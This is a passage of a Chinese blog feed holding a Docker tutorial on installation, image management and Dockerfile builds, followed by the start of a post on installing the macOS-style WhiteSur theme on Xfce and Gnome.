        <content type="html"><![CDATA[<h1 id="Docker-—-从入门到实践"><a href="#Docker-—-从入门到实践" class="headerlink" title="Docker — 从入门到实践"></a>Docker — 从入门到实践</h1><blockquote><p>资料参考: </p><p><a href="https://vuepress.mirror.docker-practice.com/">docker-practice项目</a></p><p><a href="https://yeasy.gitbook.io/docker_practice">Gitbook:yeasy&#x2F;docker_practice</a></p><p><a href="https://github.com/yeasy/docker_practice">Github:yeasy&#x2F;docker_practice</a></p></blockquote><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><h2 id="apt安装"><a href="#apt安装" class="headerlink" title="apt安装"></a>apt安装</h2><p>添加GPG密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 阿里云源</span></span><br><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | <span class="built_in">sudo</span> gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"><span class="comment"># 官方源</span></span><br><span class="line"><span class="comment"># curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span></span><br></pre></td></tr></table></figure><p>向<code>sources.list</code>中添加Docker软件源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 阿里云源</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"><span class="comment"># 官方源</span></span><br><span class="line"><span class="comment"># echo &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span></span><br></pre></td></tr></table></figure><blockquote><p>以上命令会添加稳定版本的Docker APT镜像源，如果需要测试版本的Docker请将stable改为test。</p></blockquote><p>安装<code>docker-ce</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install docker-ce</span><br></pre></td></tr></table></figure><p>安装<code>docker-compose</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker-compose docker-compose-plugin</span><br></pre></td></tr></table></figure><p>启动docker：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h2><p>从docker仓库拉取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [选项] [Docker Registry 地址[:端口号]/]仓库名[:标签]</span><br></pre></td></tr></table></figure><ul><li>地址[:端口号]：地址的格式一般是<code>&lt;域名/IP&gt;[:端口号]</code>。默认地址是Docker Hub(<code>docker.io</code>)。</li><li>仓库名：如之前所说，这里的仓库名是两段式名称，即<code>&lt;用户名&gt;/&lt;软件名&gt;</code>。对于Docker Hub，如果不给出用户名，则默认为<code>library</code>，也就是官方镜像。</li><li>标签：如果未设置标签则默认为<code>latest</code>。</li></ul><p>例如<code>docker pull ubuntu:18.04</code>完整形式为<code>docker pull docker.io/library/ubuntu:18.04</code></p><h2 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h2><h3 id="列出镜像-1"><a href="#列出镜像-1" class="headerlink" title="列出镜像"></a>列出镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><code>docker image ls</code>展示的<code>size</code>并不是物理占用的size，因为docker使用了<code>Union FS</code>，镜像是分层构建的，不同镜像可能使用相同层。要展示物理磁盘占用，使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker system <span class="built_in">df</span></span><br></pre></td></tr></table></figure><h3 id="虚悬镜像"><a href="#虚悬镜像" class="headerlink" title="虚悬镜像"></a>虚悬镜像</h3><p><code>ls</code>展现的镜像列表中，有时会有特殊的镜像，这个镜像既没有仓库名，也没有标签，均为 <none>，这个镜像原本是有镜像名和标签的，例如原来为<code>mongo:3.2</code>，随着官方镜像维护，发布了新版本后，重新<code>docker pull mongo:3.2</code>时，<code>mongo:3.2</code>这个镜像名被转移到了新下载的镜像身上，而旧的镜像上的这个名称则被取消，从而成为了<code>&lt;none&gt;</code>。除了<code>docker pull</code>可能导致这种情况，<code>docker build</code>也同样可以导致这种现象。由于新旧镜像同名，旧镜像名称被取消，从而出现仓库名、标签均为<code>&lt;none&gt;</code>的镜像。这类无标签镜像也被称为<strong>虚悬镜像(dangling image)</strong>，可以用下面的命令专门显示这类镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> -f dangling=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>一般来说，虚悬镜像已经失去了存在的价值，是可以随意删除的，可以用下面的命令一次性删除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image prune</span><br></pre></td></tr></table></figure><h3 id="中间层镜像"><a href="#中间层镜像" class="headerlink" title="中间层镜像"></a>中间层镜像</h3><p>为了加速镜像构建、重复利用资源，Docker会利用<strong>中间层镜像</strong>。所以在使用一段时间后，可能会看到一些依赖的中间层镜像。默认的<code>docker image ls</code>列表中只会显示顶层镜像，如果希望显示包括中间层镜像在内的所有镜像的话，需要加<code>-a</code>参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure><p>这样会看到很多无标签的镜像，与之前的虚悬镜像不同，这些无标签的镜像很多都是中间层镜像，是其它镜像所依赖的镜像。这些无标签镜像不应该删除，否则会导致上层镜像因为依赖丢失而出错。实际上，这些镜像也没必要删除，相同的层只会存一遍，而这些镜像是别的镜像的依赖，因此并不会因为它们被列出来而多存了一份，无论如何你也会需要它们。只要删除那些依赖它们的镜像后，这些依赖的中间层镜像也会被连带删除。</p><h3 id="列出部分镜像"><a href="#列出部分镜像" class="headerlink" title="列出部分镜像"></a>列出部分镜像</h3><p>不加任何参数的情况下，<code>docker image ls</code>会列出所有顶层镜像，但是有时候我们只希望列出部分镜像。<code>docker image ls</code>有好几个参数可以帮助做到这个事情。</p><p>根据仓库名列出镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> ubuntu</span><br></pre></td></tr></table></figure><p>列出特定的某个镜像，也就是说指定仓库名和标签：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> ubuntu:18.04</span><br></pre></td></tr></table></figure><p>除此以外，<code>docker image ls</code>还支持强大的过滤器参数<code>--filter</code>，简写<code>-f</code>。之前我们已经看到了使用过滤器来列出虚悬镜像的用法，它还有更多的用法。比如，我们希望看到在<code>mongo:3.2</code>之后建立的镜像，可以用下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> --filter since=mongo:3.2</span><br></pre></td></tr></table></figure><p>想查看某个位置之前的镜像也可以，只需要把<code>since</code>换成<code>before</code>即可。</p><p>此外，如果镜像构建时，定义了<code>LABEL</code>，还可以通过<code>LABEL</code>来过滤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> --filter label=com.example.version=0.1</span><br></pre></td></tr></table></figure><h3 id="以特定格式显示"><a href="#以特定格式显示" class="headerlink" title="以特定格式显示"></a>以特定格式显示</h3><p>只列出镜像ID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> -q</span><br></pre></td></tr></table></figure><p>另外一些时候，我们可能只是对表格的结构不满意，希望自己组织列；或者不希望有标题，这样方便其它程序解析结果等，这就用到了Go的模板语法。</p><p>比如，下面的命令会直接列出镜像结果，并且只包含镜像ID和仓库名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> --format <span class="string">&quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>或者打算以表格等距显示，并且有标题行，和默认一样，不过自己定义列：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> --format <span class="string">&quot;table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Repository&#125;&#125;\t&#123;&#123;.Tag&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">rm</span> [选项] &lt;镜像1&gt; [&lt;镜像2&gt; ...]</span><br></pre></td></tr></table></figure><h3 id="用ID、镜像名、摘要删除镜像"><a href="#用ID、镜像名、摘要删除镜像" class="headerlink" title="用ID、镜像名、摘要删除镜像"></a>用ID、镜像名、摘要删除镜像</h3><p>其中，<code>&lt;镜像&gt;</code>可以是<code>镜像短ID</code>、<code>镜像长ID</code>、<code>镜像名</code>或者<code>镜像摘要</code>。</p><p>我们可以用镜像的完整ID，也称为长ID来删除镜像。使用脚本的时候可能会用长ID，但是人工输入就太累了，所以更多的时候是用短ID来删除镜像。<code>docker image ls</code>默认列出的就已经是短ID了，一般取前3个字符以上，只要足够区分于别的镜像就可以了。</p><p>我们也可以用镜像名，也就是 <code>&lt;仓库名&gt;:&lt;标签&gt;</code>，来删除镜像。</p><p>当然，更精确的是使用<code>镜像摘要</code>删除镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span> --digests</span><br><span class="line">docker image <span class="built_in">rm</span> &lt;镜像名&gt;@&lt;DIGEST值&gt;</span><br></pre></td></tr></table></figure><h3 id="Untagged和Deleted"><a href="#Untagged和Deleted" class="headerlink" title="Untagged和Deleted"></a>Untagged和Deleted</h3><p>删除行为分为两类，一类是<code>Untagged</code>，另一类是<code>Deleted</code>。<strong>镜像的唯一标识是其ID和摘要，而一个镜像可以有多个标签</strong>。</p><p>因此当我们使用上面命令删除镜像的时候，实际上是在要求删除某个标签的镜像。所以首先需要做的是将满足我们要求的所有镜像标签都取消，这就是我们看到的<code>Untagged</code>的信息。因为一个镜像可以对应多个标签，因此当我们删除了所指定的标签后，可能还有别的标签指向了这个镜像，如果是这种情况，那么<code>Delete</code>行为就不会发生。所以并非所有的<code>docker image rm</code>都会产生删除镜像的行为，有可能仅仅是取消了某个标签而已。</p><p>当该镜像所有的标签都被取消了，该镜像很可能会失去了存在的意义，因此会触发删除行为。镜像是多层存储结构，因此在删除的时候也是从上层向基础层方向依次进行判断删除。镜像的多层结构让镜像复用变得非常容易，因此很有可能某个其它镜像正依赖于当前镜像的某一层。这种情况，依旧不会触发删除该层的行为。直到没有任何层依赖当前层时，才会真实的删除当前层。这就是为什么，有时候会奇怪，为什么明明没有别的标签指向这个镜像，但是它还是存在的原因，也是为什么有时候会发现所删除的层数和自己<code>docker pull</code>时候看到的层数不一样的原因。</p><p>除了镜像依赖以外，还需要注意的是容器对镜像的依赖。如果有用这个镜像启动的容器存在（即使容器没有运行），那么同样不可以删除这个镜像。之前讲过，容器是以镜像为基础，再加一层容器存储层，组成这样的多层存储结构去运行的。因此该镜像如果被这个容器所依赖的，那么删除必然会导致故障。如果这些容器是不需要的，应该先将它们删除，然后再来删除镜像。</p><h3 id="命令配合"><a href="#命令配合" class="headerlink" title="命令配合"></a>命令配合</h3><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除镜像名为redis的所有镜像</span></span><br><span class="line">docker image <span class="built_in">rm</span> $(docker image <span class="built_in">ls</span> -q redis)</span><br><span class="line"><span class="comment"># 删除在mongo:3.2之前的镜像</span></span><br><span class="line">docker image <span class="built_in">rm</span> $(docker image <span class="built_in">ls</span> -q -f before=mongo:3.2)</span><br></pre></td></tr></table></figure><h2 id="利用commit制作镜像（不推荐）"><a href="#利用commit制作镜像（不推荐）" class="headerlink" title="利用commit制作镜像（不推荐）"></a>利用commit制作镜像（不推荐）</h2><blockquote><p>warning：<code>docker commit</code>命令除了学习之外，还有一些特殊的应用场合，比如被入侵后保存现场等。但是，不要使用<code>docker commit</code>定制镜像，定制镜像应该使用<code>Dockerfile</code>来完成。</p></blockquote><p>镜像是多层存储，每一层是在前一层的基础上进行的修改；而容器同样也是多层存储，是在以镜像为基础层，在其基础上加一层作为容器运行时的存储层。</p><p>我们修改了容器的文件，也就是改动了容器的存储层。我们可以通过<code>docker diff</code>命令看到具体的改动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker diff &lt;容器名&gt;</span><br></pre></td></tr></table></figure><p>当我们运行一个容器的时候（如果不使用卷的话），我们做的任何文件修改都会被记录于容器存储层里。而Docker提供了一个<code>docker commit</code>命令，可以将容器的存储层保存下来成为镜像。换句话说，就是在原有镜像的基础上，再叠加上容器的存储层，并构成新的镜像。以后我们运行这个新镜像的时候，就会拥有原有容器最后的文件变化。</p><p><code>docker commit</code>的语法格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]]</span><br></pre></td></tr></table></figure><p>可选选项<code>--author</code>是指定修改的作者，<code>--message</code>则是记录本次修改的内容。</p><p>我们还可以用<code>docker history</code>具体查看镜像内的历史记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">history</span> &lt;容器名&gt;</span><br></pre></td></tr></table></figure><p>慎用<code>docker commit</code>:</p><p>使用<code>docker commit</code>命令虽然可以比较直观的帮助理解镜像分层存储的概念，但是实际环境中并不会这样使用。使用<code>docker commit</code>意味着所有对镜像的操作都是黑箱操作，生成的镜像也被称为<strong>黑箱镜像</strong>，换句话说，就是除了制作镜像的人知道执行过什么命令、怎么生成的镜像，别人根本无从得知。而且，即使是这个制作镜像的人，过一段时间后也无法记清具体的操作。这种黑箱镜像的维护工作是非常痛苦的。</p><p>而且，回顾之前提及的镜像所使用的分层存储的概念，除当前层外，之前的每一层都是不会发生改变的，换句话说，任何修改的结果仅仅是在当前层进行标记、添加、修改，而不会改动上一层。如果使用<code>docker commit</code>制作镜像，以及后期修改的话，每一次修改都会让镜像更加臃肿一次，所删除的上一层的东西并不会丢失，会一直如影随形的跟着这个镜像，即使根本无法访问到。这会让镜像更加臃肿。</p><h2 id="从rootfs压缩包导入镜像"><a href="#从rootfs压缩包导入镜像" class="headerlink" title="从rootfs压缩包导入镜像"></a>从rootfs压缩包导入镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import [选项] &lt;文件&gt;|&lt;URL&gt;|- [&lt;仓库名&gt;[:&lt;标签&gt;]]</span><br></pre></td></tr></table></figure><p>压缩包可以是本地文件、远程Web文件，甚至是从标准输入中得到。压缩包将会在镜像&#x2F;目录展开，并直接作为镜像第一层提交。</p><h2 id="导入和导出镜像"><a href="#导入和导出镜像" class="headerlink" title="导入和导出镜像"></a>导入和导出镜像</h2><p>Docker还提供了<code>docker save</code>和<code>docker load</code>命令，用以将镜像保存为一个文件，然后传输到另一个位置上，再加载进来。这是在没有<code>Docker Registry</code>时的做法，现在已经不推荐，镜像迁移应该直接使用<code>Docker Registry</code>，无论是直接使用<code>Docker Hub</code>还是使用内网私有<code>Registry</code>都可以。</p><p>导出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker save &lt;镜像名&gt; -o filename.tar <span class="comment">#镜像打包导出，未压缩</span></span><br><span class="line">docker save &lt;镜像名&gt; | gzip &gt; filename.tar.gz <span class="comment">#配合gzip进行压缩</span></span><br></pre></td></tr></table></figure><p>导入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i filename.tar.gz</span><br></pre></td></tr></table></figure><p>如果我们结合这两个命令以及<code>ssh</code>甚至<code>pv</code>的话，利用Linux强大的管道，我们可以写一个命令完成从一个机器将镜像迁移到另一个机器，并且带进度条的功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save &lt;镜像名&gt; | bzip2 | pv | ssh &lt;用户名&gt;@&lt;主机名&gt; <span class="string">&#x27;cat | docker load&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Dockerfile构建镜像"><a href="#Dockerfile构建镜像" class="headerlink" title="Dockerfile构建镜像"></a>Dockerfile构建镜像</h2><p>镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么之前提及的无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是<code>Dockerfile</code>。</p><p><code>Dockerfile</code>是一个文本文件，其内包含了一条条的<strong>指令(Instruction)</strong>，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><h3 id="FROM指定基础镜像"><a href="#FROM指定基础镜像" class="headerlink" title="FROM指定基础镜像"></a>FROM指定基础镜像</h3><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。基础镜像是必须指定的。而<code>FROM</code>就是指定基础镜像，因此一个<code>Dockerfile</code>中<code>FROM</code>是必备的指令，并且必须是第一条指令。</p><p>在<code>Docker Hub</code>上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像；也有一些方便开发、构建、运行各种语言应用的镜像。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，这些操作系统的软件库为我们提供了更广阔的扩展空间。</p><p>除了选择现有镜像为基础镜像外，Docker还存在一个特殊的镜像，名为<code>scratch</code>。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> scratch</span><br></pre></td></tr></table></figure><p>如果你以<code>scratch</code>为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p><p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，对于Linux下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接<code>FROM scratch</code>会让镜像体积更加小巧。使用Go语言开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为Go是特别适合容器微服务架构的语言的原因之一。</p><h3 id="RUN执行命令"><a href="#RUN执行命令" class="headerlink" title="RUN执行命令"></a>RUN执行命令</h3><p>RUN 指令是用来执行命令行命令的。由于命令行的强大能力，RUN 指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li>shell格式：<code>RUN &lt;命令&gt;</code>，例如：<code>RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#39; &gt; /usr/share/nginx/html/index.html</code></li><li>exec格式：<code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code>，这更像是函数调用中的格式</li></ul><p><code>Dockerfile</code>中每一个指令都会建立一层，<code>RUN</code>也不例外。每一个<code>RUN</code>的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后，<code>commit</code>这一层的修改，构成新的镜像。</p><p>使用不必要的<code>RUN</code>构建多层是没有意义的，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。而且，<code>Union FS</code>是有最大层数限制的，比如<code>AUFS</code>，曾经是最大不得超过42层，现在是不得超过127层。</p><p>建议使用<code>&amp;&amp;</code>将可归并的语句连接在一起，执行必要的清理工作。并且，<code>Dockerfile</code>支持shell类似的<code>\</code>结尾续行，以及<code>#</code>开头的注释。</p><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>使用<code>docker build</code>命令进行镜像构建。其格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build [选项] &lt;上下文路径/URL/-&gt;</span><br></pre></td></tr></table></figure><p>例如，在<code>Dockerfile</code>文件所在目录执行：<code>docker build -t nginx:v3 .</code>,从命令的输出结果中，我们可以清晰的看到镜像的构建过程。如同我们之前所说的那样，<code>RUN</code>指令启动了一个容器<code>9cdc27646c7b</code>，执行了所要求的命令，并最后提交了这一层<code>44aa4490ce2c</code>，随后删除了所用到的这个临时容器<code>9cdc27646c7b</code>。</p><p>如果注意，会看到<code>docker build</code>命令最后有一个<code>.</code>。<code>.</code>表示当前目录，指定<code>上下文路径</code>。那么什么是上下文呢？</p><p>首先我们要理解<code>docker build</code>的工作原理。Docker在运行时分为Docker引擎（也就是服务端守护进程）和客户端工具。Docker的引擎提供了一组REST API，被称为<code>Docker Remote API</code>，而如<code>docker</code>命令这样的客户端工具，则是通过这组API与Docker引擎交互，从而完成各种功能。因此，虽然表面上我们好像是在本机执行各种docker功能，但实际上，一切都是使用的远程调用形式在服务端（Docker引擎）完成。也因为这种C&#x2F;S设计，让我们操作远程服务器的Docker引擎变得轻而易举。</p><p>当我们进行镜像构建的时候，并非所有定制都会通过<code>RUN</code>指令完成，经常会需要将一些本地文件复制进镜像，比如通过<code>COPY</code>指令、<code>ADD</code>指令等。而<code>docker build</code>命令构建镜像，其实并非在本地构建，而是在服务端，也就是Docker引擎中构建的。那么在这种C&#x2F;S的架构中，如何才能让服务端获得本地文件呢？</p><p>这就引入了上下文的概念。当构建的时候，用户会指定构建镜像上下文的路径，<code>docker build</code>命令得知这个路径后，会将路径下的所有内容打包，然后上传给Docker引擎。这样 Docker引擎收到这个上下文包后，展开就会获得构建镜像所需的一切文件。</p><p>如果在<code>Dockerfile</code>中这么写：<code>COPY ./package.json /app/</code>，这并不是要复制执行<code>docker build</code>命令所在的目录下的package.json，也不是复制Dockerfile所在目录下的package.json，而是复制<code>上下文（Context）</code>目录下的package.json。</p><p>因此，<code>COPY</code>这类指令中的源文件的路径都是相对路径。这也是初学者经常会问的为什么<code>COPY ../package.json /app</code>或者<code>COPY /opt/xxxx /app</code>无法工作的原因，因为这些路径已经超出了上下文的范围，Docker引擎无法获得这些位置的文件。如果真的需要那些文件，应该将它们复制到上下文目录中去。</p><p>如果观察 docker build 输出，我们其实已经看到了这个发送上下文的过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -t nginx:v3 .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>理解构建上下文对于镜像构建是很重要的，避免犯一些不应该的错误。比如有些初学者在发现<code>COPY /opt/xxxx /app</code>不工作后，于是干脆将<code>Dockerfile</code>放到了硬盘根目录去构建，结果发现<code>docker build</code>执行后，在发送一个几十GB的东西，极为缓慢而且很容易构建失败。那是因为这种做法是在让<code>docker build</code>打包整个硬盘，这显然是使用错误。一般来说，应该会将<code>Dockerfile</code>置于一个空目录下，或者项目根目录下。如果该目录下没有所需文件，那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给Docker引擎，那么可以用<code>.gitignore</code>一样的语法写一个<code>.dockerignore</code>，该文件是用于剔除不需要作为上下文传递给Docker引擎的。</p><p>那么为什么会有人误以为<code>.</code>是指定<code>Dockerfile</code>所在目录呢？这是因为在默认情况下，如果不额外指定<code>Dockerfile</code>的话，会将上下文目录下的名为<code>Dockerfile</code>的文件作为 Dockerfile。<br>这只是默认行为，实际上<code>Dockerfile</code>的文件名并不要求必须为<code>Dockerfile</code>，而且并不要求必须位于上下文目录中，比如可以用<code>-f ../Dockerfile.php</code>参数指定某个文件作为<code>Dockerfile</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给Xfce/Gnome换上MacoOS WhiteSur主题</title>
      <link href="/2022/08/04/Tools/linux_config/"/>
      <url>/2022/08/04/Tools/linux_config/</url>
      
        <content type="html"><![CDATA[<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt upgrade -y</span><br><span class="line">apt install fonts-wqy-microhei git -y</span><br></pre></td></tr></table></figure><p>打开一次Firefox浏览器，初始化配置后关闭</p><h1 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vinceliuice/WhiteSur-gtk-theme.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/vinceliuice/WhiteSur-icon-theme.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/vinceliuice/WhiteSur-cursors.git</span><br></pre></td></tr></table></figure><h1 id="Xfce配置"><a href="#Xfce配置" class="headerlink" title="Xfce配置"></a>Xfce配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> WhiteSur-gtk-theme</span><br><span class="line"><span class="built_in">sudo</span> ./install.sh</span><br><span class="line"><span class="built_in">sudo</span> ./tweaks.sh -f <span class="comment"># 调整Firefox样式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> WhiteSur-icon-theme</span><br><span class="line"><span class="built_in">sudo</span> ./install.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> WhiteSur-cursors</span><br><span class="line"><span class="built_in">sudo</span> ./install.sh</span><br></pre></td></tr></table></figure><p>主题配置：</p><ul><li><code>外观-样式/图标</code>选择WhiteSur系列主题</li><li><code>外观-字体</code>选择文泉驿系列，字体大小10-11，DPI-150%</li><li><code>窗口管理器-样式</code>选择WhiteSur hdpi系列，标题字体大小11，拖动按钮布局为关闭、最小化、最大化排列（macos布局）</li><li><code>鼠标和触摸板-主题</code>选择WhiteSur系列主题，光标大小34</li></ul><p>其他配置：</p><ul><li>禁用屏幕休眠：<code>电源管理器-显示-从不</code>，<code>屏幕保护-禁用屏幕保护程序</code></li></ul><h1 id="Gnome配置"><a href="#Gnome配置" class="headerlink" title="Gnome配置"></a>Gnome配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> WhiteSur-gtk-theme</span><br><span class="line">./install.sh -l -HD <span class="comment"># 在用户目录安装主题，参考https://github.com/vinceliuice/WhiteSur-gtk-theme#fix-for-libadwaita-not-perfect</span></span><br><span class="line"><span class="built_in">sudo</span> ./tweaks.sh -f <span class="comment"># 